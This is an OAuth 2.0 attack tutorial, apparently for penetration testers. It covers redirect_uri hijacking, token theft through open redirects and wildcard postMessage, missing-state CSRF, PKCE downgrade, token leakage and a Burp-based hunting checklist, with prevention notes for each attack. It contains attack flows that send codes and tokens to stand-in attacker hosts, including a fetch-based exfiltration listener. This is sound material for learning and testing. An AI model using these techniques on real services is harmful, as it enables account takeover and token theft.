OAuth 2.0 Attacks.

How delegated authorization works, why every handoff is a trust assumption, and how to break each one.

01

The technology

OAuth 2.0 is an authorization framework (RFC 6749). It lets a user grant a third-party app limited access to their resources on another service — without sharing their password. The mechanism behind "Sign in with Google," enterprise SSO, and every "Connect your account" button.

Key distinction

OAuth ≠ authentication. OAuth handles authorization (who can access what). OpenID Connect (OIDC) is the authentication layer built on top. When you see id_token, openid scope, or /userinfo, that's OIDC extending OAuth.

Instead of sharing passwords, OAuth introduces tokens — short-lived, scoped credentials that represent specific permissions. The user authenticates with the authorization server directly; the client app never sees their password.

The four roles

Resource Owner

The user. Owns the data. The person clicking "Approve" on the consent screen.

Client

The app requesting access. Confidential = backend (keeps secrets). Public = SPA/mobile (cannot).

Authorization Server

Authenticates users, gets consent, issues tokens. Validates redirect_uri, client_id, scope.

Resource Server

The API holding protected data. Validates the access token on every request.

Key parameters

client_id — identifies the app. redirect_uri — where the code/token goes after consent. response_type — what comes back (code or token). scope — permissions requested. state — CSRF protection. code_challenge / code_verifier — PKCE.

The core handoff

User ──(1) "Login with Social"──▸ Client App ``` │ ▼ Client ──(2) redirect──▸ Authorization Server │ /auth?client_id=X&redirect_uri=callback │ &response_type=code&scope=openid profile │ &state=random123 ▼ User authenticates + consents │ ▼ Auth Server ──(3) 302──▸ /callback?code=ABC&state=random123 │ ▼ Client ──(4) POST /token──▸ Auth Server [back-channel] │ sends: code + client_id + client_secret ▼ Auth Server returns: access_token + refresh_token │ ▼ Client ──(5) API call──▸ Resource Server │ Authorization: Bearer access_token ▼ Protected resource ✓
```

Every arrow is a trust assumption. Every trust assumption is an attack surface.

Restaurant analogy

OAuth is like a valet parking service. You (resource owner) hand a valet ticket (authorization code) to a restaurant app (client). The valet service (auth server) checks the ticket, then gives the restaurant a time-limited key (access token) that only opens the trunk — not the glove box. The restaurant never gets your car key (password).

PKCE — Proof Key for Code Exchange

Public clients can't store a client_secret. Without PKCE, anyone who intercepts the authorization code can exchange it for a token. PKCE adds a challenge-response that binds the code to the client that requested it:

Client generates: ``` code_verifier = crypto_random (43-128 chars) code_challenge = BASE64URL(SHA256(code_verifier)) Auth request: /auth?…&code_challenge=XYZ&code_challenge_method=S256 Token exchange: POST /token → code + code_verifier Server verifies: SHA256(code_verifier) === stored code_challenge ✓ match → issue token ✗ mismatch → reject
```

Implicit flow — why it's dangerous

Risk surface

Token goes directly into the URL fragment. Fragments are in browser history, leak via Referer headers, are extractable via XSS, and survive HTTP 302 redirects. No back-channel exchange, no server-side validation, no refresh tokens. OAuth 2.1 formally removes this flow.

03

redirect_uri hijack

Restaurant analogy

You hand the valet your keys with a note: "return my car to Hotel A." The valet should check their approved list. If they deliver to whatever address the note says — the thief just writes their own address.

Normal flow

The redirect_uri tells the auth server where to send the code after consent. The server validates it against a pre-registered whitelist. Only exact matches pass.

Attack

Auth server doesn't validate redirect_uri. Attacker swaps it to their domain. Victim clicks → code delivered to attacker. Attacker replays it on the real callback.

Victim clicks malicious link ``` ▼ Auth Server: redirect_uri=https://attacker.com │ no validation ✗ ▼ 302 → https://attacker.com/?code=STOLEN │ Attacker replays: GET /callback?code=STOLEN ▼ Logged in as victim ✓
```

Bypass techniques

When validation exists but isn't exact-match, try these in Repeater:

04

Token theft via open redirect

Restaurant analogy

The valet is stricter: "I only deliver to Hotel A." But Hotel A has a shuttle that'll take you anywhere. Valet drops the car at Hotel A (valid), the shuttle drives it to the attacker.

Normal flow (implicit)

With response_type=token, the token lands in the URL fragment (#access_token=). Fragments never leave the browser in HTTP requests. The callback page JS extracts it.

Attack — two flaws chained

Flaw 1: prefix-match on redirect_uri — accepts path traversal. Flaw 2: open redirect on client domain. Fragment survives the 302 redirect.

Key insight

URL fragments survive HTTP 302 redirects in most browsers. If you redirect the user after the token lands in the fragment, the fragment follows to the new destination.

Exploit page (no hash) → script redirects to: ``` /auth?redirect_uri=target/callback/../post/next?path=attacker │ prefix validates ✓ ▼ target/post/next?path=attacker#access_token=TOKEN │ open redirect fires, fragment preserved ▼ attacker/exploit#access_token=TOKEN │ script reads hash → converts to query param ▼ attacker/?access_token=TOKEN ← access log ✓
```
Encoding gotcha

The ? and = inside redirect_uri must be URL-encoded (%3f, %3d) so the auth server doesn't parse them as separate OAuth params.

Weakness

prefix-match redirect_uri open redirect on client implicit flow

Prevention

exact-match redirect_uri kill open redirects use code flow + PKCE
05

Token theft via proxy page

Restaurant analogy

The delivery driver is told: "shout the package contents when you arrive at Hotel A." They shout to whoever is listening. Attacker parks a van with a microphone in the lot.

Normal flow

Some apps use window.postMessage to pass OAuth data between windows. The second arg specifies which origin can receive. Using '*' means any parent receives it.

Attack

redirect_uri locked down. No open redirect. But a page on the client calls postMessage(data, '*'). Attacker embeds OAuth flow in an iframe — they become the parent.

┌──────────────────────────────────────┐ ``` │ Attacker exploit page │ │ ┌────────────────────────────────┐ │ │ │ iframe: OAuth → proxy page │ │ │ │ → postMessage(data, ‘*’) │ │ │ └──────────┬─────────────────────┘ │ │ │ message event │ │ ▼ │ │ window.addEventListener(‘message’) │ │ fetch(’/?t=’ + JSON.stringify(e.data))│ └──────────────────────────────────────┘
```
Gotcha

e.data may be an object, not a string. encodeURIComponent(e.data) gives [object Object]. Always wrap with JSON.stringify().

Weakness

postMessage with '*' no event.origin check embeddable in iframe

Prevention

specify exact origin validate event.origin CSP frame-ancestors
06

Missing state = OAuth CSRF

Normal flow

state is OAuth's CSRF token. Client generates crypto-random value, stores in session, sends in auth request, verifies match on callback.

Attack — login CSRF

Attacker starts OAuth with their account, captures callback URL, tricks victim into loading it. Victim's session links to attacker's OAuth identity.

Attacker starts OAuth → approves with THEIR account ``` │ intercepts: /callback?code=ATTACKER_CODE ▼ Sends URL to victim (img, iframe, link) │ ▼ Victim’s browser: GET /callback?code=ATTACKER_CODE │ no state check ✗ ▼ Client links attacker’s identity → victim’s session ▼ Attacker logs in with their creds → victim’s account ✓
```

Weakness

missing state static / predictable not bound to session

Prevention

crypto random per request bind to session strict match on callback
07

PKCE downgrade / bypass

Normal flow

PKCE binds the code to the client via code_challenge / code_verifier. Server verifies SHA256(verifier) == challenge before issuing tokens.

Attack — downgrade

Server supports PKCE but doesn't enforce it. Strip both params from auth request. Server issues code anyway. Exchange without verifier — token returned.

Burp Repeater test: ``` 1. Capture: GET /auth?…&code_challenge=XYZ&code_challenge_method=S256 1. Strip both PKCE params → send 1. Server returns code? → PKCE optional ✗ 1. POST /token with code, NO code_verifier 1. Token returned? → full bypass ✗ Also test: - code_challenge_method=plain (challenge = verifier) - Replay verifier from different session
```

Weakness

PKCE optional plain method accepted no verifier check on /token

Prevention

require PKCE all clients enforce S256 only reject /token without verifier
```
08

Token leakage via Referer & storage

```
Referer header

Callback page loads external resources (analytics, fonts). Browser sends current URL — including ?code=ABC — in the Referer header to every external domain.

Browser history

Implicit flow tokens in fragments, auth codes in query strings — recorded in history. Shared devices, sync, shoulder surfing.

Insecure storage

Tokens in localStorage are accessible to any JS on the page — one XSS and they're gone. Non-HttpOnly cookies are equally exposed.

Weakness

tokens in URL external resources on callback localStorage missing Referrer-Policy

Prevention

Referrer-Policy: no-referrer no external on callback HttpOnly Secure SameSite response_mode=form_post
```

Hunt checklist

```

Systematic testing order for engagements.

01

Map the flow. Capture full login in Burp. Identify: flow type, all params, endpoints (/auth, /token, /userinfo), confidential vs public client, PKCE presence.

02

Attack redirect_uri. Repeater. Escalate: domain swap → subdomain → path traversal → query → encoding → double encoding → param pollution → @. If strict, hunt open redirects on the client to chain.

03

Hunt open redirects. Spider client. Params: url, next, path, return, redirect, goto, dest, continue. Low-sev alone — critical chained with OAuth.

04

Grep for postMessage. All client JS for postMessage( with '*'. Check addEventListener('message' for missing event.origin validation. Test iframe embeddability.

05

Check state. Remove it. Reuse old. Modify. If callback doesn't reject, flow is CSRF-vulnerable. Test login CSRF: link attacker's OAuth to victim's session.

06

Test PKCE. Strip code_challenge + code_challenge_method. Server still issues code? Exchange without verifier. Try method=plain.

07

Scope escalation. Add scopes: scope=openid admin. Does resource server independently validate scope per API call?

08

Token leakage. External resources on callback? Check Referer. Where are tokens stored? Are codes single-use + short-lived?

09

JWT validation. For id_token: alg:none, key confusion (RS256→HS256), expired tokens, wrong aud/iss. Replay old tokens.

10

Client secrets in public clients. Grep APK decompilation + minified JS for client_secret. Mobile apps with custom URI schemes = scheme hijacking.
